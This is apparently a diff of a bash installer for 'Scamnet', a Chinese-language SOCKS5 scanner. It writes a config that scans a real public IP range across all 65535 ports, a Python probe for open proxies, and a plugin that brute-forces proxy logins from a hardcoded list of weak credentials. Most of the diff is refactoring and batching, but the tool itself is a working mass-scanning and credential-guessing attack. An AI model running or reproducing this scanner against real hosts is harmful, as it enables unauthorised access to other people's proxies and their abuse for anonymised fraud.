@@ -1,5 +1,5 @@
 #!/bin/bash
-# main.sh - Scamnet OTC SOCKS5 全端口扫描器（v2.7 - 真正等待完成）
+# main.sh - Scamnet OTC SOCKS5 全端口扫描器（v2.8 - 分批提交 + 防崩溃）
 set -e
 
 RED='\033[31m'; GREEN='\033[32m'; YELLOW='\033[33m'; NC='\033[0m'
@@ -7,7 +7,7 @@ LOG_DIR="logs"; mkdir -p "$LOG_DIR"
 LOG="$LOG_DIR/scanner_$(date +%Y%m%d_%H%M%S).log"
 log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG"; }
 
-echo -e "${GREEN}[OTC] Scamnet v2.7 (全端口 1-65535 - 真正等待完成)${NC}"
+echo -e "${GREEN}[OTC] Scamnet v2.8 (全端口 1-65535 - 分批防崩溃)${NC}"
 echo "日志 → $LOG"
 
 # ==================== 依赖 ====================
@@ -31,28 +31,26 @@ range: "157.254.32.0-157.254.52.255"
 ports: !range 1-65535
 timeout: 6.0
 workers: 300
+batch_size: 10000
 EOF
 log "config.yaml 创建"
 
-# ==================== scanner.py（关键：手动 shutdown）================
+# ==================== scanner.py（分批 + 防崩溃）================
 cat > scanner.py << "PY"
-import sys, os
-sys.path.append(os.path.dirname(__file__))
+import sys, os; sys.path.append(os.path.dirname(__file__))
 import yaml
 from yaml import SafeLoader
 from plugins import load_plugins
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import socket, ipaddress, threading, time
 from tqdm import tqdm
 
-# 注册 !range
 def range_constructor(loader, node):
     value = loader.construct_scalar(node)
     start, end = map(int, value.split('-'))
     return list(range(start, end + 1))
 yaml.add_constructor('!range', range_constructor, Loader=SafeLoader)
 
-# 加载配置
 with open('config.yaml') as f:
     cfg = yaml.load(f, Loader=SafeLoader)
 
@@ -60,6 +58,7 @@ INPUT_RANGE = cfg['range']
 RAW_PORTS = cfg['ports']
 TIMEOUT = cfg.get('timeout', 6.0)
 MAX_WORKERS = cfg.get('workers', 300)
+BATCH_SIZE = cfg.get('batch_size', 10000)
 
 if isinstance(RAW_PORTS, list):
     PORTS = RAW_PORTS
@@ -71,14 +70,9 @@ print(f"[DEBUG] 端口数量: {len(PORTS)} (期望: 65535)")
 
 file_lock = threading.Lock()
 valid_count = 0
-progress_lock = threading.Lock()
 plugins = load_plugins()
 
-def safe_update(pbar):
-    with progress_lock:
-        pbar.update(1)
-
-def test_proxy(ip, port, pbar):
+def test_proxy(ip, port):
     try:
         result = {'ip':ip, 'port':port, 'status':'FAIL', 'country':'XX', 'latency':'-', 'export_ip':'-', 'auth':''}
         ok, lat, exp = is_socks5_available(ip, port, None, None)
@@ -103,67 +97,47 @@ def test_proxy(ip, port, pbar):
             plugins['output_file'].save_valid(result)
     except Exception:
         pass
-    finally:
-        safe_update(pbar)
 
 def get_country(ip):
     try:
         for n in ['geo_ipapi']:
             if n in plugins and (c := plugins[n].get(ip)):
                 return c
-    except:
-        pass
+    except: pass
     return 'XX'
 
 def is_socks5_available(ip, port, u=None, p=None):
     try:
         with socket.create_connection((ip, port), timeout=TIMEOUT) as s:
             s.settimeout(TIMEOUT)
-            if u and p:
-                methods = b'\x05\x02\x00\x02'
-            else:
-                methods = b'\x05\x01\x00'
-            s.sendall(methods)
-            resp = s.recv(2)
-            if len(resp) != 2 or resp[0] != 5:
-                return False, 0, None
-            method = resp[1]
-            if method == 0:
-                pass
-            elif method == 2 and u and p:
-                auth = b'\x01' + bytes([len(u)]) + u.encode() + bytes([len(p)]) + p.encode()
-                s.sendall(auth)
-                auth_resp = s.recv(2)
-                if len(auth_resp) < 2 or auth_resp[1] != 0:
-                    return False, 0, None
-            else:
-                return False, 0, None
-            target = socket.inet_aton(socket.gethostbyname('ifconfig.me')) + b'\x00\x50'
-            s.sendall(b'\x05\x01\x00\x01' + target)
-            conn_resp = s.recv(10)
-            if len(conn_resp) < 2 or conn_resp[1] != 0:
-                return False, 0, None
+            m = b'\x05\x02\x00\x02' if u and p else b'\x05\x01\x00'
+            s.sendall(m)
+            r = s.recv(2)
+            if len(r) != 2 or r[0] != 5: return False, 0, None
+            if r[1] == 0: pass
+            elif r[1] == 2 and u and p:
+                a = b'\x01' + bytes([len(u)]) + u.encode() + bytes([len(p)]) + p.encode()
+                s.sendall(a)
+                resp = s.recv(2)
+                if len(resp) < 2 or resp[1] != 0: return False, 0, None
+            else: return False, 0, None
+            t = socket.inet_aton(socket.gethostbyname('ifconfig.me')) + b'\x00\x50'
+            s.sendall(b'\x05\x01\x00\x01' + t)
+            resp = s.recv(10)
+            if len(resp) < 2 or resp[1] != 0: return False, 0, None
             s.sendall(b'GET / HTTP/1.1\r\nHost: ifconfig.me\r\n\r\n')
             resp = b''
-            start = time.time()
-            while time.time() - start < TIMEOUT:
+            st = time.time()
+            while time.time() - st < TIMEOUT:
                 try:
-                    chunk = s.recv(1024)
-                    if not chunk:
-                        break
-                    resp += chunk
-                    if b'\r\n\r\n' in resp:
-                        break
-                except:
-                    break
-            if b'\r\n\r\n' in resp:
-                body = resp.split(b'\r\n\r\n', 1)[1]
-                export_ip = body.decode(errors='ignore').split()[0] if body else 'Unknown'
-            else:
-                export_ip = 'Unknown'
-            return True, round((time.time() - start) * 1000), export_ip
-    except:
-        return False, 0, None
+                    c = s.recv(1024)
+                    if not c: break
+                    resp += c
+                    if b'\r\n\r\n' in resp: break
+                except: break
+            export_ip = resp.split(b'\r\n\r\n', 1)[1].decode(errors='ignore').split()[0] if b'\r\n\r\n' in resp else 'Unknown'
+            return True, round((time.time() - st) * 1000), export_ip
+    except: return False, 0, None
 
 def main():
     print('[OTC] 扫描启动')
@@ -175,57 +149,61 @@ def main():
 
     pbar = tqdm(total=total, desc='扫描', unit='port', ncols=100)
 
-    def worker(ip, port):
-        test_proxy(ip, port, pbar)
-
-    # 关键：手动创建 + 手动 shutdown
-    executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)
-    try:
+    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as exe:
+        futures = []
+        count = 0
         for ip in ips:
             for port in PORTS:
-                executor.submit(worker, ip, port)
-    finally:
-        executor.shutdown(wait=True)  # 真正等待所有任务完成
+                futures.append(exe.submit(test_proxy, ip, port))
+                count += 1
+                if count >= BATCH_SIZE:
+                    for f in as_completed(futures):
+                        f.result()
+                        pbar.update(1)
+                    futures.clear()
+                    count = 0
+        # 处理剩余任务
+        for f in as_completed(futures):
+            f.result()
+            pbar.update(1)
 
     pbar.close()
     print(f'\n[+] 完成！发现 {valid_count} 个可用代理')
 
-if __name__ == '__main__':
-    main()
+if __name__ == '__main__': main()
 PY
-log "scanner.py 已写入（真正等待）"
+log "scanner.py 已写入（分批防崩溃）"
 
-# ==================== 插件 ====================
+# ==================== 插件（保持不变）===================
 mkdir -p plugins
 
 cat > plugins/__init__.py << "PY"
 import importlib, os
 def load_plugins():
-    plugins = {}
+    p = {}
     path = os.path.dirname(__file__)
-    for file in os.listdir(path):
-        if file.endswith('.py') and file != '__init__.py':
-            name = file[:-3]
-            plugins[name] = importlib.import_module(f'plugins.{name}')
-    return plugins
+    for f in os.listdir(path):
+        if f.endswith('.py') and f != '__init__.py':
+            n = f[:-3]
+            p[n] = importlib.import_module(f'plugins.{n}')
+    return p
 PY
 
 cat > plugins/auth_weak.py << "PY"
 WEAK_PASSWORDS = [
-        "123:123", "111:111", "1:1", "qwe123:qwe123", "abc:abc", "aaa:aaa",
+    "123:123", "111:111", "1:1", "qwe123:qwe123", "abc:abc", "aaa:aaa",
     "1234:1234", "admin:admin", "socks5:socks5", "123456:123456",
     "12345678:12345678", "admin123:admin", "proxy:proxy", "admin:123456", "root:root",
-    "12345:12345", "test:test", "user:user", "guest:guest", "admin:", "888888:888888", 
-  "test123:test123", "qwe:qwe", "qwer:qwer", "qwer:qwer", "11:11", "222:222", "2:2", "3:3",
-  "12349:12349", "12349:12349", "user:123", "user:1234", "user:12345", "user:123456"
+    "12345:12345", "test:test", "user:user", "guest:guest", "admin:", "888888:888888",
+    "test123:test123", "qwe:qwe", "qwer:qwer", "11:11", "222:222", "2:2", "3:3",
+    "12349:12349", "user:123", "user:1234", "user:12345", "user:123456"
 ]
 def brute(ip, port):
     from scanner import is_socks5_available, TIMEOUT
     for pair in WEAK_PASSWORDS:
         u, p = pair.split(':')
         ok, _, _ = is_socks5_available(ip, port, u, p)
-        if ok:
-            return u, p
+        if ok: return u, p
     return None
 PY
 
@@ -235,11 +213,9 @@ def get(ip):
     try:
         r = requests.get(f'http://ip-api.com/json/{ip}?fields=countryCode', timeout=6)
         if r.status_code == 200:
-            code = r.json().get('countryCode', '').strip().upper()
-            if len(code) == 2 and code.isalpha():
-                return code
-    except:
-        pass
+            c = r.json().get('countryCode','').strip().upper()
+            if len(c) == 2 and c.isalpha(): return c
+    except: pass
     return None
 PY
 
